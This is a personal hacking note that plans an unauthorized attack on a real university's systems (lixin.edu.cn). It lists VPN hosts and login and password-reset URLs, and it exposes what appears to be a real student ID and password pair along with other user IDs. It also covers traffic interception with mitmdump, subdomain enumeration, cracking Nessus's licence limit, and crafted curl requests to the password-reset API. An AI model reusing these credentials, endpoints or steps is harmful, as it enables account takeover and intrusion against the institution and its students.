---
created: 2021-12-22T13:45:58+08:00
modified: 2022-01-11T02:36:59+08:00
---

# The Hack (Get password and tests)

Scan this website with kali linux.

The Intranet Gateway For Campus:
https://app.topsec.com.cn

mitmdump --mode socks5 --listen-port 8050 -w logs.log --flow-detail 3 --set stream_websocket=true

pdvpn.lixin.edu.cn
pdvpn2.lixin.edu.cn
vpn.lixin.edu.cn
vpn2.lixin.edu.cn

xxb.lixin.edu.cn/jszl/57078.htm

201960630:CHENweiyi0519

https://cas.paas.lixin.edu.cn/cas/login?service=https%3A%2F%2Flxjw.lixin.edu.cn%2Fcas%2Flogin

https://security-center.paas.lixin.edu.cn/find-pwd

20039370

missing puzzle for changing password:

trial user:
201960249

have searched related websites with site:lixin.edu.cn, could get more if keep doing so, using dnsenum.

to get all site links with proper titles, we need to use playwright.

nessus scanner has that 16 ips limitation, we need to crack/patch it first.

to master kali linux, recommend to scrape kali_tools and tutorialspoint for kali, or just simply using manpage.

cisco router is untouched till now. need we to scan it?
(intermediate ip addresses)

curl 'https://personal-security-center.paas.lixin.edu.cn/api/v1/personal/open/passwordStrategy/verify' \
  -H 'Connection: keep-alive' \
  -H 'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98", "Google Chrome";v="98"' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (X11; CrOS aarch64 14371.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4729.0 Safari/537.36' \
  -H 'sec-ch-ua-platform: "Chrome OS"' \
  -H 'Origin: https://security-center.paas.lixin.edu.cn' \
  -H 'Sec-Fetch-Site: same-site' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://security-center.paas.lixin.edu.cn/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw '{"password":"abcdefABC","userId":""}' \
  --compressed

curl 'https://personal-security-center.paas.lixin.edu.cn/api/v1/personal/open/forgotPassword/changePassword' \
  -H 'Connection: keep-alive' \
  -H 'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98", "Google Chrome";v="98"' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (X11; CrOS aarch64 14371.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4729.0 Safari/537.36' \
  -H 'sec-ch-ua-platform: "Chrome OS"' \
  -H 'Origin: https://security-center.paas.lixin.edu.cn' \
  -H 'Sec-Fetch-Site: same-site' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://security-center.paas.lixin.edu.cn/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw '{"confirmPassword":"abc123ABC","newPassword":"abc123ABC","nonce":"YzhhZmZjYzktNWQ3Ny00MGU1LTg0ODgtYTYzZTMzMDZkMjU0XzE2NDAyNjg5MzcyNTY"}' \
  --compressed
